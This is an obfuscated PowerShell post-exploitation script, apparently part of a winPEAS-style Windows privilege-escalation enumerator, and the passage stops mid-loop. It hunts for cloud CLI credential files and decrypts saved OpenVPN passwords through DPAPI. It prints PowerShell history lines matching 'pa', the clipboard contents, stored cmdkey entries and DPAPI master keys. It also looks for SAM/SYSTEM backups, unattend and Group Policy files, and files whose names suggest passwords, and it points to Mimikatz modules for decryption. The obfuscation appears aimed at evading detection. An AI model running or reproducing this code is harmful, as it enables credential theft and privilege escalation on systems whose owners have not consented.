&("{3}{2}{0}{1}" -f'-H','ost','rite','W') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{4}{6}{1}{3}{0}{5}{8}{2}{7}" -f ' Clo','crh','edentials C','crh','========','u','=','heck','d Cr'))  -repLAce  'crh',[cHar]124)
${us`E`Rs} = (&("{3}{0}{1}{2}"-f'-Ch','i','ldItem','Get') ((("{2}{0}{1}"-f '0}Us','ers','C:{'))  -f [ChAR]92)).Name
${cc`RE`ds} = @(((("{4}{0}{3}{5}{2}{6}{1}" -f'4','als','d','cr','.awsmd','e','enti')).repLace(([chAr]109+[chAr]100+[chAr]52),[StRiNG][chAr]92)),
  ((("{4}{2}{7}{10}{5}{9}{8}{6}{3}{0}{1}" -f 'ntials','.db','ata','e','AppD','cloud','d','LZNRoamingL','ZNcre','L','ZNg')).rePlACE(([chAr]76+[chAr]90+[chAr]78),'\')),
  ((("{12}{2}{1}{10}{6}{9}{3}{11}{8}{0}{5}{7}{4}" -f'a','0}','pData{','d{0','s','cy_credentia','mi','l','leg','ng{0}gclou','Roa','}','Ap'))-f[CHAr]92),
  ((("{3}{9}{0}{8}{10}{1}{2}{6}{5}{4}{7}" -f 'ng','dSvDacc','ess_to','AppDataSvDRoam','ns','e','k','.db','SvDg','i','clou')).replACe('SvD','\')),
  ((("{0}{1}{4}{2}{3}"-f'.azurewTRac','cessTokens','so','n','.j'))  -crEpLacE 'wTR',[cHAr]92),
  ((("{0}{1}{3}{4}{2}"-f '.az','ure','file.json','Ze9azu','rePro')).REpLACe('Ze9',[StrING][cHaR]92))) 
foreach (${u} in ${U`SE`RS}) {
  ${cc`RE`dS} | &("{3}{2}{1}{0}" -f'-Object','ach','rE','Fo') {
    if (&("{2}{0}{1}" -f 'st','-Path','Te') "c:\$u\$_") { &("{2}{0}{1}"-f 'o','st','Write-H') ("$_ "+'found'+'!') -ForegroundColor ("{0}{1}" -f 'R','ed') }
  }
}


&("{0}{1}{2}"-f 'Wr','ite-Ho','st') ""
if (${tIm`Es`T`AMp}) { &("{1}{0}{2}"-f'Elapse','Time','d') }
&("{1}{0}{2}" -f 'rite-Ho','W','st') -ForegroundColor ("{1}{0}" -f'lue','B') ((("{6}{3}{5}{0}{7}{4}{2}{8}{1}"-f'===','eck','cmd','=','APP','===','=','=qlWqlW ',' Ch')) -CRepLaCe 'qlW',[chAR]124)
if (&("{0}{2}{1}"-f'Te','th','st-Pa') ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
  &("{1}{2}{0}" -f'Host','Write','-') ("{16}{9}{1}{17}{15}{14}{8}{18}{11}{19}{6}{2}{7}{10}{12}{20}{13}{5}{0}{3}{4}" -f'n#a','k.hacktr','do','ppcmd.','exe','latio','/win','ws-lo','wi','://boo','cal-privil','ws-ha','eg','ca','yz/','.x','https','icks','ndo','rdening','e-es') -ForegroundColor ("{0}{1}"-f 'Yel','low')
  &("{2}{1}{0}" -f 'ost','rite-H','W') ("$Env:SystemRoot\System32\inetsrv\appcmd.exe "+'e'+'xists!') -ForegroundColor ("{1}{0}"-f'd','Re')
}


&("{2}{1}{0}"-f'-Host','te','Wri') ""
if (${T`iMeS`TAMP}) { &("{1}{2}{0}"-f'ed','T','imeElaps') }
&("{0}{3}{1}{2}"-f 'Write-H','s','t','o') -ForegroundColor ("{0}{1}" -f 'B','lue') ((("{7}{1}{5}{4}{6}{0}{2}{3}" -f'Credentia','KO','l','s Check',' O','lKO','penVPN ','=========l')).rePlaCE(([Char]108+[Char]75+[Char]79),'|'))

${K`eyS} = &("{0}{1}{2}{3}"-f'G','et-','Child','Item') ((("{1}{4}{2}{7}{8}{9}{6}{3}{0}{5}{10}" -f'onfi','HKCU','wareOd','dGc',':OdGSoft','g','O','GOpenVP','N-GU','I','s')).RepLaCe(([Char]79+[Char]100+[Char]71),[StRInG][Char]92)) -ErrorAction ("{3}{2}{5}{0}{4}{1}"-f 'o','inue','en','Sil','nt','tlyC')
if (${k`eys}) {
  &("{0}{2}{1}" -f'Add-Ty','e','p') -AssemblyName ("{1}{3}{0}{4}{2}"-f'S','Syste','urity','m.','ec')
  ${it`eMS} = ${k`eyS} | &("{4}{3}{2}{1}{0}" -f't','ec','Obj','rEach-','Fo') { &("{1}{0}{4}{2}{3}"-f 'tem','Get-I','pert','y','Pro') ${_}.PsPath }
  foreach (${iT`em} in ${ItE`Ms}) {
    ${En`cr`ypTedB`yTEs} = ${iT`EM}.'auth-data'
    ${e`NTRopy} = ${i`TEm}.'entropy'
    ${EnT`R`OPy} = ${ent`Ropy}[0..((${en`Tr`opy}.Length) - 2)]

    ${d`e`cRy`PTedByT`ES} =  ( Dir  VaRIaBLE:QFEH3W  ).Value::Unprotect(
      ${EN`CR`YPtEDby`Tes}, 
      ${E`NT`RopY}, 
       (  gET-VarIaBLe  ("Y"+"atRD")  -VAlU)::CurrentUser)
 
    &("{2}{0}{1}"-f'rit','e-Host','W') (  ( cHIlDItEM ("vARi"+"AB"+"Le:FwT3Y") ).VAlue::Unicode.GetString(${De`crYP`TED`BYtes}))
  }
}


&("{1}{2}{0}"-f 'e-Host','W','rit') ""
if (${T`im`EstA`MP}) { &("{2}{0}{1}" -f 'imeEla','psed','T') }
&("{1}{2}{0}{3}"-f '-Hos','Writ','e','t') -ForegroundColor ("{0}{1}" -f 'Bl','ue') ((("{10}{2}{12}{3}{14}{16}{13}{7}{9}{8}{0}{15}{1}{5}{6}{11}{4}" -f'st','r','===','={0}{0}','ch Only)','d ','Se','She','l Hi','l','====','ar','=','wer',' ','ory (Passwo','Po'))-F [cHAR]124)

&("{1}{2}{0}" -f'ost','Wr','ite-H') ((("{1}{4}{7}{8}{2}{5}{3}{0}{6}"-f 'le','=','erShe','nso','gdw','ll Co',' History','gdw',' Pow')).RePlace('gdw','|'))
&("{0}{2}{1}"-f'Wr','e-Host','it') ((("{7}{12}{13}{8}{10}{14}{3}{16}{15}{0}{19}{1}{18}{9}{11}{17}{4}{5}{2}{6}"-f 'et-','Get-PS','to','an','n).H','is','rySavePath','=','tory, ru','ineOpt','n this c','i','GlMGlM ','To see all his','omm',': G','d','o','Readl','Content ('))-cRePlacE ([CHAr]71+[CHAr]108+[CHAr]77),[CHAr]124)
&("{0}{1}{2}" -f 'Write','-H','ost') $(&("{1}{2}{0}" -f't','Get-Con','ten') (&("{2}{3}{0}{4}{6}{5}{1}" -f'R','neOption','Get-','PS','e','dLi','a')).HistorySavePath | &("{0}{3}{1}{4}{2}" -f 'Sele','-Stri','g','ct','n') ('pa'))

&("{0}{1}{2}" -f'Writ','e-H','ost') ((("{2}{5}{0}{3}{1}{6}{7}{4}" -f'AppData','ne Console','=fpjf',' PSReadli',' ','pj ',' Histor','y'))-rePlAcE'fpj',[chAR]124)
&("{2}{1}{0}"-f '-Host','ite','Wr') (('={'+'0}{0} ')-F [CHaR]124+'T'+'o '+'s'+'ee '+'al'+'l '+'h'+'istory'+', '+'run'+' '+'th'+'is '+'com'+'mand: '+'Get'+'-Co'+'n'+'tent '+"$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")
&("{1}{2}{0}{3}"-f'o','Write','-H','st') $(&("{2}{0}{1}"-f 'et-Conten','t','G') "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | &("{0}{1}{3}{2}"-f'Selec','t','ing','-Str') ('pa'))


&("{1}{0}{3}{2}"-f'rit','W','-Host','e') ((("{12}{3}{5}{7}{2}{6}{8}{10}{9}{1}{11}{4}{0}"-f 'ck ',' ',' tr','Ei0Ei0 Powes','e','Rh','an','ell default','srcipt','history',' ','ch','='))-cRePlAce  'Ei0',[cHar]124)
if (&("{2}{1}{0}" -f'th','t-Pa','Tes') ((("{5}{2}{10}{7}{4}{9}{0}{8}{3}{6}{1}" -f 'cri','}','nv:S','{','e{0','{1}e','0','riv','pts','}trans','ystemD'))-F  [Char]92,[Char]36)) { "Default transcripts found at $($env:SystemDrive)\transcripts\ " }



&("{1}{2}{0}" -f'Host','W','rite-') ""
if (${TIm`e`sTa`Mp}) { &("{3}{2}{1}{0}"-f 'sed','Elap','me','Ti') }
&("{2}{1}{0}" -f't','os','Write-H') -ForegroundColor ("{0}{1}" -f 'Bl','ue') ((("{6}{3}{9}{5}{7}{4}{2}{0}{1}{8}" -f 'M','ENT','RON','====','VI','wmO','===',' EN',' VARIABLES ','==wmO'))  -rePlACe ([chAR]119+[chAR]109+[chAR]79),[chAR]124)
&("{1}{2}{0}"-f'ite-Host','W','r') ("{0}{15}{5}{1}{2}{6}{8}{11}{7}{10}{18}{4}{12}{16}{9}{17}{13}{14}{3}" -f 'Ma','a','ke','lowing locations','g ','ou can t',' ad','ying/','vantage of','e ','creat',' modif','a ',' t','he fol','ybe y','binary in som','of','in')
&("{1}{0}{2}"-f'-H','Write','ost') ("{7}{8}{1}{4}{0}{2}{3}{5}{12}{9}{10}{6}{13}{11}"-f ' - place','ies perm',' b','inary','issions',' or',' instead o','PATH variable en','tr','LL to exe','cute','mate',' D','f legiti')
&("{1}{2}{0}"-f '-Host','Wri','te') ("{13}{10}{4}{14}{16}{21}{0}{18}{1}{6}{5}{12}{22}{17}{9}{11}{7}{2}{19}{15}{3}{20}{8}"-f 'ha','r','privile','ij','t','xy','icks.','local-','g','rde','t','ning/windows-','z/windo','h','p','-escalation#dll-h','s://book','-ha','ckt','ge','ackin','.','ws') -ForegroundColor ("{1}{0}"-f'ellow','Y')

&("{0}{2}{1}"-f'Get-','dItem','Chil') ("{1}{0}"-f'v:','en') | &("{1}{2}{0}" -f'-Table','Form','at') -Wrap


&("{2}{0}{1}"-f 'r','ite-Host','W') ""
if (${tIMes`T`A`mp}) { &("{3}{2}{1}{0}" -f'sed','eElap','m','Ti') }
&("{2}{1}{0}"-f 'Host','rite-','W') -ForegroundColor ("{1}{0}" -f'e','Blu') ((("{2}{3}{8}{6}{9}{1}{4}{0}{5}{7}"-f 'Sti','3a03','=','=','a0 ','cky','==',' Notes Check','===','==')) -REPLAce '3a0',[char]124)
if (&("{0}{1}{2}" -f 'Te','st','-Path') "C:\Users\$env:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite") {
  &("{0}{2}{1}"-f'Write','t','-Hos') ("{4}{1}{3}{8}{2}{10}{11}{7}{0}{5}{15}{9}{6}{14}{12}{13}"-f 'uld have cr','icky ',' da','N','St','eden',' in plain t','Co','otes','ls','tabase foun','d. ','t:',' ','ex','tia')
  &("{0}{1}{2}"-f 'Wr','ite-H','ost') "C:\Users\$env:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite"
}



&("{1}{2}{0}" -f 'ost','Writ','e-H') ""
if (${Ti`MEST`A`mp}) { &("{2}{0}{1}" -f 'imeEl','apsed','T') }
&("{2}{1}{0}"-f'ost','ite-H','Wr') -ForegroundColor ("{1}{0}" -f'ue','Bl') ((("{9}{4}{0}{8}{5}{2}{3}{1}{6}{7}"-f'=0','Ch','tia','ls ','=======','en','e','ck','C60C6 Cached Cred','='))-cRePLaCe([cHar]48+[cHar]67+[cHar]54),[cHar]124)
&("{1}{0}{2}" -f 'r','W','ite-Host') ("{13}{10}{9}{8}{11}{1}{3}{2}{6}{16}{17}{0}{7}{15}{4}{5}{18}{14}{12}" -f'dows-','t','ck','ri','n','ing/','s','h','ook','/b','tps:/','.hack','ndows-vault','ht','al-privilege-escalation#wi','arde','.xy','z/win','windows-loc') -ForegroundColor ("{2}{0}{1}"-f 'll','ow','Ye') 
&("{0}{2}{1}" -f 'cm','exe','dkey.') ("{0}{1}" -f '/li','st')


&("{1}{0}{2}"-f'rite-Ho','W','st') ""
if (${T`imeST`AMP}) { &("{2}{3}{1}{0}" -f 'd','apse','TimeE','l') }
&("{1}{0}{2}"-f 'ri','W','te-Host') -ForegroundColor ("{0}{1}"-f'Blu','e') ((("{7}{14}{1}{11}{13}{10}{8}{0}{12}{2}{4}{3}{6}{5}{9}"-f 'ck','=={0',' ','API ','DP','PC Mas','R','===','he','ter Keys',' C','}{0','ing for','}','===='))-F[Char]124)
&("{2}{0}{1}{3}"-f'ri','te','W','-Host') ((("{1}{13}{16}{4}{15}{3}{18}{7}{6}{8}{0}{19}{22}{2}{12}{10}{11}{21}{9}{20}{5}{17}{14}" -f 'y9za ','Use the',' appr','dpapi:','atz','o','rk','ste','e','gume','t','e ','opria',' Mimi','decrypt',' 9za','k',' ',':ma','module w','nts (/rpc) t','ar','ith')).rEpLaCE('9za',[sTRinG][ChaR]39))
&("{1}{2}{0}" -f 't','Wr','ite-Hos') ("{1}{11}{6}{18}{3}{21}{12}{5}{19}{20}{15}{22}{10}{17}{8}{9}{7}{2}{4}{14}{16}{0}{13}" -f'p','ht','o','ows-h','n#d','e','ook.h','alati','ivile','ge-esc','-p','tps://b','rd','i','p','ws-lo','a','r','acktricks.xyz/wind','ning/','windo','a','cal') -ForegroundColor ("{2}{1}{0}" -f'w','ello','Y')

${apPDaT`AroAm`i`Ng} = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\"
${APpdaT`Al`OCAl} = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\"
if ( &("{0}{1}" -f'Test-Pat','h') "$appdataRoaming\Protect\") {
  &("{2}{0}{3}{1}" -f'o','t','Write-H','s') ('fou'+'nd: '+"$appdataRoaming\Protect\")
  &("{0}{2}{1}" -f 'Get-Ch','em','ildIt') -Path "$appdataRoaming\Protect\" -Force | &("{2}{0}{1}"-f'o','rEach-Object','F') {
    &("{2}{0}{1}{3}" -f 'rite-Ho','s','W','t') ${_}.FullName
  }
}
if ( &("{1}{2}{0}" -f'th','Te','st-Pa') "$appdataLocal\Protect\") {
  &("{2}{0}{1}" -f'it','e-Host','Wr') ('fou'+'nd:'+' '+"$appdataLocal\Protect\")
  &("{2}{0}{1}{3}" -f'et','-ChildIt','G','em') -Path "$appdataLocal\Protect\" -Force | &("{2}{0}{1}" -f'a','ch-Object','ForE') {
    &("{0}{1}{2}"-f'Wri','te-','Host') ${_}.FullName
  }
}


&("{2}{1}{3}{0}" -f 'ost','rite-','W','H') ""
if (${TimEST`A`mP}) { &("{2}{1}{0}{3}" -f'aps','meEl','Ti','ed') }
&("{1}{2}{0}" -f'Host','Write','-') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{5}{1}{4}{9}{2}{10}{7}{3}{6}{11}{0}{8}" -f 'a','===','9 ','g for D','===8W98','===','PAP','n','ster Keys','W','Checki','I Cred M')) -REPLace  '8W9',[CHAr]124)
&("{1}{0}{2}" -f 'o','Write-H','st') ((("{15}{3}{11}{10}{14}{0}{6}{8}{16}{13}{4}{2}{7}{5}{12}{1}{9}"-f 'n1g m','cryp','p','e Mimikatz n1gdp','a','pri','odule','pro',' ','t',':','api:','ate /masterkey to de','ith ','cred','Use th','w')) -replACE  ([Char]110+[Char]49+[Char]103),[Char]39) 
&("{0}{2}{1}" -f 'Wri','st','te-Ho') ((("{13}{6}{4}{12}{7}{0}{1}{3}{2}{11}{5}{9}{8}{14}{10}"-f 'ys from memo','ry with the Mi','8','mikatz p',' ','lsa::','u can also extract many','PI masterke',' mod','dpapip8Y','le','Ysekur','DPA','Yo','u')) -repLaCE([CHAR]112+[CHAR]56+[CHAR]89),[CHAR]39) 
&("{2}{0}{1}" -f'ite-Ho','st','Wr') ("{9}{8}{1}{2}{12}{11}{22}{3}{0}{17}{16}{18}{5}{15}{21}{7}{13}{10}{4}{6}{20}{19}{14}" -f 'z','book','.hac','s.xy','es','ndo','cala','pri','/','https:/','ge-','ric','kt','vile','api','ws-','ows-hard','/wind','ening/wi','ion#dp','t','local-','k') -ForegroundColor ("{0}{1}" -f 'Yel','low')

if ( &("{2}{3}{1}{0}"-f'ath','st-P','T','e') "$appdataRoaming\Credentials\") {
  &("{1}{2}{0}"-f'ChildItem','G','et-') -Path "$appdataRoaming\Credentials\" -Force
}
if ( &("{1}{2}{0}" -f't-Path','Te','s') "$appdataLocal\Credentials\") {
  &("{2}{1}{0}{3}" -f 'l','-Chi','Get','dItem') -Path "$appdataLocal\Credentials\" -Force
}


&("{0}{1}{2}"-f'Write-','Hos','t') ""
if (${TImesT`A`mP}) { &("{1}{2}{0}"-f'psed','Tim','eEla') }
&("{1}{2}{0}"-f'st','Write-','Ho') -ForegroundColor ("{1}{0}" -f 'lue','B') ((("{4}{1}{2}{6}{0}{5}{3}{8}{7}"-f' Current ','==','=={0}{0','ogged o','=====','L','}','Users','n '))-F [CHAR]124)
try { &("{1}{0}"-f 'er','qus') }catch { &("{0}{2}{1}"-f'Wr','st','ite-Ho') ((("{9}{4}{10}{2}{1}{5}{0}{11}{6}{8}{13}{7}{12}{3}" -f'ot','an',' comm','stem','3gquser2','d n','ot prese','s','nt ','2','3g',' n','y','on '))  -REPLACE'23g',[ChAr]39) } 


&("{0}{1}{3}{2}"-f'Wr','i','e-Host','t') ""
if (${Tim`ES`TAmp}) { &("{2}{0}{1}"-f 'Elapse','d','Time') }
&("{2}{1}{0}"-f 'st','ite-Ho','Wr') -ForegroundColor ("{1}{0}"-f'lue','B') ((("{0}{1}{3}{2}{4}{5}" -f '======','==','afw','=','afw',' Remote Sessions'))  -rePLAce 'afw',[cHaR]124)
try { &("{2}{0}{1}" -f 'in','sta','qw') } catch { &("{1}{0}{2}"-f '-Ho','Write','st') ((("{8}{3}{6}{5}{11}{7}{2}{10}{4}{1}{0}{9}" -f 'on ','esent ','m','sta{','ot pr','} c','0','m','{0}qwin','system','and n','o'))  -F [CHAR]39) }


&("{2}{0}{1}"-f 'ite-','Host','Wr') ""
if (${T`IMe`StAmp}) { &("{2}{3}{0}{1}"-f'Elap','sed','Ti','me') }
&("{2}{0}{1}" -f 's','t','Write-Ho') -ForegroundColor ("{1}{0}" -f 'e','Blu') ((("{6}{9}{11}{15}{4}{0}{1}{8}{14}{10}{7}{3}{5}{2}{12}{13}"-f 'ick','e','terac',' to','ros t',' in','=====','min','t','===','ad','=','t',')','s (does require ','GQlGQl Kerbe')).rePlaCe('GQl','|'))
try { &("{1}{0}" -f 'list','k') } catch { &("{1}{2}{0}"-f'Host','Write','-') ("{1}{5}{2}{4}{3}{0}"-f'ns','No ','ve','sio',' ses','acti') }


&("{0}{2}{1}" -f'Write-H','st','o') ""
if (${tIME`S`Ta`mP}) { &("{2}{1}{0}"-f'apsed','eEl','Tim') }
&("{3}{0}{2}{1}"-f'rite-','t','Hos','W') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{4}{5}{6}{2}{1}{3}{0}" -f 'ny)','f','pBoard (i',' a','========={0','}{0} Printi','ng Cli'))-F  [ChaR]124)
&("{4}{0}{1}{2}{3}" -f 'ar','d','Tex','t','Get-ClipBo')


&("{2}{1}{0}"-f't','e-Hos','Writ') ""
if (${t`iMEst`AMp}) { &("{2}{1}{0}"-f'sed','eElap','Tim') }
&("{0}{3}{2}{1}" -f'Wri','st','o','te-H') -ForegroundColor ("{1}{0}" -f'lue','B') ((("{8}{7}{1}{2}{3}{6}{5}{10}{9}{4}{0}"-f'k','{0} Un','atte','n','c',' Fil','ded','===={0}','=====',' Che','es'))-F  [char]124)
@(((("{9}{2}{5}{8}{0}{6}{7}{3}{4}{1}" -f 'syspr','ml','dvW','dv','sysprep.x','i','ep','g','ndowsgdv','C:g')).rePLacE(([CHAR]103+[CHAR]100+[CHAR]118),'\')),
  ((("{1}{4}{0}{6}{2}{5}{7}{3}" -f 's3','C:3L','pre','nf','QWindow','p3','LQsys','LQsysprep.i'))  -rEPlaCE ([cHaR]51+[cHaR]76+[cHaR]81),[cHaR]92),
  ((("{2}{0}{6}{1}{3}{5}{4}" -f ':PJL','in','C','dows','prep.inf','PJLsys','W')).REpLAcE(([cHar]80+[cHar]74+[cHar]76),[STrING][cHar]92)),
  ((("{6}{9}{1}{5}{8}{10}{4}{3}{0}{7}{2}" -f 'n','Wi','d.xml','rLM4Unatte','4Panthe','nd','C:','de','owsL','LM4','M'))-rEpLace ([chaR]76+[chaR]77+[chaR]52),[chaR]92),
  ((("{8}{2}{9}{7}{0}{1}{4}{6}{3}{5}"-f'T4G','PantherT4G',':','m','Unatte','l','nd.x','4GWindows','C','T')).rEPLAcE('T4G','\')),
  ((("{8}{1}{6}{0}{2}{5}{4}{3}{7}{9}" -f'ndow','63DW','s63','attend63DUnat','Panther63DUn','D','i','tend','C:','.xml')).rePlAce(([CHaR]54+[CHaR]51+[CHaR]68),[sTRINg][CHaR]92)),
  ((("{7}{0}{1}{11}{2}{8}{12}{10}{9}{4}{5}{6}{3}" -f 'Win','dowswHOP','rwHO','l','Unattende','d','.xm','C:wHO','Un','dwHO','ten','anthe','at')).RePLACe('wHO','\')),
  ((("{9}{4}{3}{2}{1}{0}{8}{7}{5}{6}"-f'm32VnFSy','ste','nFSy','WindowsV','F','epVnFun','attend.xml','r','sp','C:Vn')).RepLacE(([char]86+[char]110+[char]70),[sTRINg][char]92)),
  ((("{7}{8}{3}{2}{4}{6}{0}{1}{5}" -f 'rep','{0}unattended.x','{0','}Windows{0}System32','}','ml','Sysp','C:{','0')) -f  [chAR]92),
  ((("{3}{0}{2}{1}{4}" -f 'Tuna','.tx','ttend','C:J3','t'))-REplace ([CHAr]74+[CHAr]51+[CHAr]84),[CHAr]92),
  ((("{3}{0}{1}{2}" -f 'atten','d.i','nf','C:yLUun'))-cREPlACe ([cHAr]121+[cHAr]76+[cHAr]85),[cHAr]92)) | &("{4}{1}{0}{3}{2}" -f 'ch','rEa','Object','-','Fo') {
  if (&("{2}{1}{0}"-f 'h','est-Pat','T') ${_}) {
    &("{2}{0}{1}"-f 'rite-Hos','t','W') ("$_ "+'fo'+'und.')
  }
}



&("{0}{2}{1}"-f 'Write-','ost','H') ""
if (${Ti`ME`stAmP}) { &("{0}{2}{1}" -f 'TimeEla','ed','ps') }
&("{0}{1}{2}{3}" -f 'Write','-','Ho','st') -ForegroundColor ("{0}{1}" -f 'B','lue') ((("{3}{5}{0}{9}{10}{4}{8}{6}{2}{7}{1}" -f '0}{','s','Chec','==',' Bac','======={',' ','k','kup','0','} SAM / SYSTEM')) -F  [CHaR]124)

@(
  "$Env:windir\repair\SAM",
  "$Env:windir\System32\config\RegBack\SAM",
  "$Env:windir\System32\config\SAM",
  "$Env:windir\repair\system",
  "$Env:windir\System32\config\SYSTEM",
  "$Env:windir\System32\config\RegBack\system") | &("{1}{3}{2}{0}"-f 'Object','Fo','h-','rEac') {
  if (&("{2}{1}{0}" -f 'ath','t-P','Tes') ${_} -ErrorAction ("{0}{3}{4}{2}{1}"-f 'Si','nue','tlyConti','l','en')) {
    &("{1}{3}{2}{0}"-f 'st','Write','o','-H') ("$_ "+'Foun'+'d!') -ForegroundColor ("{0}{1}" -f'r','ed')
  }
}

&("{0}{1}{2}"-f'W','rite-Hos','t') ""
if (${tiMes`TA`MP}) { &("{1}{0}{2}" -f'lapse','TimeE','d') }
&("{2}{0}{1}"-f 'e-Hos','t','Writ') -ForegroundColor ("{1}{0}"-f 'e','Blu') ((("{4}{6}{5}{2}{3}{0}{1}" -f 'he','ck','icy Passwo','rd C','=========w','l','P6wP6 Group Po')).rePlaCe(([chAr]119+[chAr]80+[chAr]54),[sTrINg][chAr]124))

${Gr`oU`PpoLicy} = @(("{2}{0}{1}{3}"-f 'roups.','x','G','ml'), ("{1}{0}{2}{3}"-f 'ervices','S','.x','ml'), ("{3}{1}{2}{0}" -f'asks.xml','eduled','t','Sch'), ("{1}{3}{2}{0}" -f'ml','D','x','ataSources.'), ("{2}{0}{1}" -f'.','xml','Printers'), ("{1}{2}{0}"-f 'xml','Driv','es.'))
if (&("{2}{0}{1}" -f '-','Path','Test') ("$env:SystemDrive\Microsoft\Group "+('Pol'+'i'+'cynuj'+'history').REpLaCe('nuj',[string][CHAr]92))) {
  &("{1}{2}{0}" -f'tem','Ge','t-ChildI') -Recurse -Force ("$env:SystemDrive\Microsoft\Group "+('Po'+'lic'+'yb'+'P9history').rEplAcE('bP9',[StRing][cHaR]92)) -Include @GroupPolicy
}

if (&("{0}{2}{1}"-f'Test-P','th','a') ("$env:SystemDrive\Documents "+'and'+' '+('Se'+'t'+'t'+'ingshuNAll ').REPlAce('huN',[STRinG][chaR]92)+('UsersGQhA'+'pp'+'l'+'icatio'+'n ').rEPlAcE('GQh',[sTRINg][CHAr]92)+('D'+'ata{0'+'}Mi'+'croso'+'ft{'+'0'+'}'+'G'+'roup ')-f  [cHar]92+('Policy{0'+'}his'+'to'+'ry') -F[chaR]92) ) {
  &("{1}{0}{2}" -f'et-ChildIte','G','m') -Recurse -Force ("$env:SystemDrive\Documents "+'and'+' '+('Sett'+'i'+'ng'+'s{0}Al'+'l ')-F [chaR]92+('Us'+'er'+'sz'+'FmAppli'+'cation ').REPLAcE('zFm','\')+('D'+'ata'+'Dp1M'+'icrosoft'+'Dp1G'+'r'+'o'+'up'+' ').rEplace('Dp1','\')+('Poli'+'cy7behist'+'ory').rePlace(([CHaR]55+[CHaR]98+[CHaR]101),'\'))
}

&("{1}{0}{2}" -f'rite-H','W','ost') ""
if (${tiMEs`T`AmP}) { &("{3}{1}{2}{0}" -f'd','eE','lapse','Tim') }
&("{0}{1}{2}"-f 'W','r','ite-Host') -ForegroundColor ("{1}{0}" -f'ue','Bl') ((("{1}{0}{5}{2}{3}{4}"-f'========wsbw','=','b',' Recy','cle Bin TIP:','s')).rePlACe('wsb','|'))
&("{2}{3}{0}{1}" -f 'Hos','t','Writ','e-') ("{32}{16}{4}{19}{29}{27}{11}{25}{17}{9}{5}{7}{2}{18}{0}{6}{15}{33}{13}{31}{14}{10}{26}{8}{3}{21}{1}{22}{24}{28}{34}{23}{12}{20}{30}"-f ' ','t/p','o','soft.n','ed',' nir','ma','s','r','rom','www','he recycle','y','is','http://','y a','f cr','f','ft','entials are f','_tools','e','as','cover','s',' bin, tool ','.ni',' t','word_r','ound in','.html','t: ','i','ss','e') -ForegroundColor ("{0}{1}" -f 'Yel','low')



&("{0}{1}{2}"-f 'W','ri','te-Host') ""
if (${TiM`E`ST`AmP}) { &("{0}{1}{2}"-f 'TimeEla','p','sed') }
&("{2}{0}{1}"-f 'Ho','st','Write-') -ForegroundColor ("{1}{0}"-f'ue','Bl') ((("{6}{1}{3}{0}{5}{7}{4}{2}"-f 'ord Check i','=====','ers','=VRjVRj  Passw','d','n Fil','===','es/Fol')) -CREPlaCe  ([CHAR]86+[CHAR]82+[CHAR]106),[CHAR]124)



if (${t`i`meSTaMP}) { &("{1}{0}{2}{3}"-f'meE','Ti','lap','sed') }
&("{2}{1}{0}"-f'ite-Host','r','W') -ForegroundColor ("{1}{0}"-f'ue','Bl') ((("{22}{0}{4}{12}{9}{11}{13}{30}{8}{19}{2}{18}{21}{23}{26}{17}{20}{1}{7}{15}{28}{16}{14}{5}{24}{25}{10}{6}{27}{3}{29}" -f'===','will ta','n',' t','=','b a',' or tea ','ke so',' ','swor','e','d Che','=={0}{0} Pas','ck','a','me t','e, gr','ach d','g at','Starti','rive. This ',' ro','===','o',' coff','e','t of e','kinda','ime. Lik','ime.','.'))  -F[chAr]124)
&("{2}{1}{3}{0}" -f't','e-H','Writ','os') -ForegroundColor ("{0}{1}"-f 'B','lue') ((('====='+'====z'+'2mz'+'2m ')  -crEplace  'z2m',[CHaR]124)+'Look'+'in'+'g '+'t'+'hrou'+'gh '+'each'+' '+'d'+'rive,'+' '+'sea'+'r'+'chi'+'ng '+'fo'+'r '+"$fileExtensions")

try { &("{2}{0}{1}"-f 'w-Obje','ct','Ne') -ComObject ("{1}{0}{3}{2}"-f 'l.Ap','Exce','cation','pli') | &("{1}{0}"-f 'ull','Out-N'); ${RE`ADE`XCEl} = ${TR`Ue} }catch {${rEa`dE`xCel} = ${fA`l`se}; if(${E`XCel}){
  &("{0}{1}{2}"-f 'Wri','te','-Host') -ForegroundColor ("{1}{0}" -f 'w','Yello') ("{8}{2}{0}{4}{3}{6}{11}{9}{10}{1}{7}{12}{5}"-f's','l still point ','o',' d','t','d.','oes no','out','H','have Excel COM object',', wil','t ',' excel files when foun')
}}
${DR`i`VES}.Root | &("{2}{0}{1}{3}{4}" -f'ach-O','b','ForE','jec','t') {
  ${dRi`Ve} = ${_}
  &("{2}{3}{4}{0}{1}"-f 'I','tem','Ge','t-Ch','ild') ${dr`I`VE} -Recurse -Include ${f`iLeExT`eNs`IOnS} -ErrorAction ("{3}{2}{0}{4}{1}" -f 'yConti','ue','l','Silent','n') -Force | &("{1}{2}{0}" -f'ject','Fo','rEach-Ob') {
    ${Pa`Th} = ${_}
    
    if (${Pa`TH}.FullName | &("{3}{2}{0}{1}"-f 'ct-strin','g','e','sel') ("{0}{3}{2}{1}" -f'(?i','*','ang.',').*l')) {
      
    }
    if(${PA`TH}.FullName | &("{1}{0}{2}"-f 't-S','Selec','tring') ((("{2}{1}{3}{0}"-f'BKHB.*Pass.*','KHBKH','(?i).:','B.*KH')) -RePlacE([chaR]75+[chaR]72+[chaR]66),[chaR]92)){
      &("{0}{1}{2}" -f 'writ','e-h','ost') -ForegroundColor ("{1}{0}" -f'lue','B') "$($path.FullName) contains the word 'pass' "
    }
    if(${P`Ath}.FullName | &("{2}{1}{3}{4}{0}" -f'ng','e','S','lect-Str','i') ((("{5}{2}{0}{1}{4}{3}{6}{7}"-f 'p','HWpHW',':','pHW.*u','.*pHW','.','ser','.*'))-cREplAce  'pHW',[ChAr]92) ){
      &("{1}{0}{2}"-f 'rite','W','-Host') -ForegroundColor ("{0}{1}"-f'B','lue') "$($path.FullName) contains the word 'user' -excluding the 'users' directory "
    }
    
